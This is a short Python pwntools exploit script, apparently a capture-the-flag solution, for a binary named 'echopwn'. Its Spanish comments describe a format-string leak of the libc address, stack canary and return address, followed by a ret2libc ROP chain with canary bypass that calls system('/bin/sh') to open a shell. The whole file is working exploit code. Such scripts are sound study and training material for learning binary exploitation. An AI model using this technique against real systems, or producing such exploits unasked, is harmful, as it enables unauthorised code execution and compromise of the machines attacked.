#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF("echopwn")
libc = elf.libc
HOST = ""
PORT = 1

gs = '''
b doRead
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


#io = remote(HOST, PORT)
io = start()
io.recv() 
#El comando canary me da el valor del canario en el stack
#Leak format string %2 glibc %4 pie %13$lx el canary
io.sendline('%3$lx-%13$lx-%15$lx')
leak = io.recvline().decode('latin-1')
print(leak)

libc.address = int(leak.strip().split('-')[0], 16) - 0x1EB980
canary = int(leak.strip().split('-')[1], 16)
ret = int(leak.strip().split('-')[2], 16)
base = ret - 0x1297

log.info(hex(ret))
log.info(hex(canary))
log.info(hex(next(libc.search(b'/bin/sh'))))


payload = flat (
    "A"*52, 
    canary,
    "B"*8,         # ebp
    base + 0x0101a,# ret Necesario para alinear pila y evitar sigsev en system
    base + 0x1303, # pop rdi ; ret
    next(libc.search(b'/bin/sh')),
    libc.sym['system'],
    endianness = 'little', word_size = 64, sign = False
    )
io.sendline(payload)
io.interactive()
